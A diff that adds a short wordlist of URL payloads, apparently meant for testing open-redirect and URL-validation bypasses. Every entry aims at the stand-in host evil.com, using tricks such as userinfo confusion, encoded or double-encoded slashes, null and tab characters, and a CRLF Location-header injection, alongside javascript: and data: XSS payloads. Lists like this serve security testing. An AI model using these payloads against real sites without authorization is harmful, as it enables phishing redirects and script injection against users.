@@ -1,0 +1,26 @@
+https://target.com@evil.com
+https://target.com.evil.com
+https://target.com\@evil.com
+https://target.com%2f@evil.com
+https://target.com%00.evil.com
+https://target.com%20.evil.com
+https://target.com#@evil.com
+https://target.com?@evil.com
+https://evil.com#target.com
+https://evil.com?target.com
+https://target.com/redirect?url=https://evil.com
+//target.com.evil.com
+//target.com@evil.com
+//target.com%2f@evil.com
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+//evil.com/%0d%0aLocation:%20https://evil.com
+https://evil.com%2f..%2ftarget.com
+https://evil.com/%2e%2e/target.com
+%2f%2fevil.com
+%252f%252fevil.com
+https:%2f%2fevil.com
+//evil.com\@target.com
+//evil.com%5c@target.com
+//evil.com	.target.com
+//evil.com%09.target.com
